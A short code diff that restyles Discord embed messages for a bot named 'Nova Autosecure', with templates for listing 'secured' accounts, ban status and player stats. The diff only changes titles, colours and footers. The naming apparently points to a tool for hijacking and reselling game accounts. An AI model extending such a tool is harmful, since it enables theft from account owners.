@@ -102,8 +102,11 @@ module.exports = (type, client) => {
       };
     case "listaccount":
       return {
-        title: "Account secured in %TIMETAKEN% seconds",
-        color: 11716576,
+        title: "Account Secured in %TIMETAKEN%s",
+        author: {
+          name: "Nova Autosecure"
+        },
+        color: 16097035,
         footer: {
           text: "%BAN%"
         },
@@ -120,7 +123,11 @@ module.exports = (type, client) => {
       };
         case "statsmsg":
       return {
-        color: 11716576,
+        title: "Player Stats Overview",
+        color: 16097035,
+        footer: {
+          text: "Nova Autosecure"
+        },
         fields: [
           { name: "Rank", value: "%RANK%", inline: true },
           { name: "NWL", value: "%NWL%", inline: true },
